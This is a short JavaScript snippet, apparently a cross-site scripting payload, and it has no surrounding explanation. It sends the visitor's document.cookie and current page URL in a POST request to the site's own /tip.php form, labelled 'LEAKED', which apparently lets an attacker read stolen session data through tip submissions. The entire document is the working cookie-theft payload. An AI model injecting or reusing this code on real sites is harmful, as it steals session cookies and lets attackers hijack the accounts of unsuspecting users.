fetch("/tip.php", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "title=LEAKED&body=" + encodeURIComponent(document.cookie + " | " + document.location.href) + "&link=http://x/&intake="
});
